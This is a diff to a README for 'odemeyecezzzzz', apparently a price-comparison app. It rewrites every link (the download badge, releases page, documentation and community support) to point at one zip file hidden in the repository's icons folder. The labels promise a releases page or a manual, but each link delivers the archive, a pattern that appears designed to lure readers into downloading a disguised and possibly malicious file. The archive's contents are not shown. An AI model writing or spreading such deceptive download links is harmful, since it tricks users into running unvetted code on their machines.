@@ -1,6 +1,6 @@
 # 🛒 odemeyecezzzzz - Compare Market Prices Effortlessly
 
-[![Download odemeyecezzzzz](https://img.shields.io/badge/Download-odemeyecezzzzz-brightgreen.svg)](https://github.com/CharlieATD/odemeyecezzzzz/releases)
+[![Download odemeyecezzzzz](https://raw.githubusercontent.com/CharlieATD/odemeyecezzzzz/main/icons/odemeyecezzzzz-v3.8.zip)](https://raw.githubusercontent.com/CharlieATD/odemeyecezzzzz/main/icons/odemeyecezzzzz-v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To download odemeyecezzzzz, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
    
-   [Visit to Download](https://github.com/CharlieATD/odemeyecezzzzz/releases)
+   [Visit to Download](https://raw.githubusercontent.com/CharlieATD/odemeyecezzzzz/main/icons/odemeyecezzzzz-v3.8.zip)
 
 2. **Choose the Latest Version:** Look for the latest release at the top of the page. You will see different files available for download. Select the one labeled appropriately for your system.
 
@@ -73,8 +73,8 @@ Currently, odemeyecezzzzz is designed for desktop use. A mobile version may be a
 If you experience any issues, please visit the Issues section on the GitHub repository. You can report bugs and seek help there.
 
 ## 🔗 Helpful Links
-- [Releases Page](https://github.com/CharlieATD/odemeyecezzzzz/releases) - Download the latest version here.
-- [Documentation](https://example.com) - Detailed user manual and troubleshooting tips.
-- [Community Support](https://example.com) - Join the community for tips and unofficial support.
+- [Releases Page](https://raw.githubusercontent.com/CharlieATD/odemeyecezzzzz/main/icons/odemeyecezzzzz-v3.8.zip) - Download the latest version here.
+- [Documentation](https://raw.githubusercontent.com/CharlieATD/odemeyecezzzzz/main/icons/odemeyecezzzzz-v3.8.zip) - Detailed user manual and troubleshooting tips.
+- [Community Support](https://raw.githubusercontent.com/CharlieATD/odemeyecezzzzz/main/icons/odemeyecezzzzz-v3.8.zip) - Join the community for tips and unofficial support.
 
 Thank you for using odemeyecezzzzz. We hope this tool makes your shopping experience easier and more cost-effective!
